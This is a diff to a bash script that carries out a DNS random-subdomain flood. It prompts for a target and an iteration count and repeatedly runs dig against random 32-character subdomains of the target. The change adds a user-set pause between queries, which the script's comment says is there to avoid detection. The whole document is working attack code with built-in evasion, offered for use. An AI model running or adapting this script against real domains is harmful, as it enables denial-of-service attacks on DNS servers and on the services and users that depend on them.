@@ -21,11 +21,15 @@ read TARGET
 echo "Please type the number of iterations: "
 read ITERATIONS
 
+# Prompting the user for the desired number of seconds lapsed between requests.
+echo "Please type the number of lapsed seconds between the requests: "
+read LAPSED_SECONDS
+
 # Carrying out the attack against the supplied target for the specified number of iterations.
 while [ $i -lt $ITERATIONS ]
 do
         dig `cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1`.$TARGET # Creating a random subdomain which is prepended to the target before performing the query.
-        sleep 1 # Adding a delay between lookup requests to avoid detection. Feel free to increment this value as per your use case.
+        sleep $LAPSED_SECONDS # Adding a delay between lookup requests to avoid detection. Feel free to increment this value as per your use case.
         let "i++"
 done
 
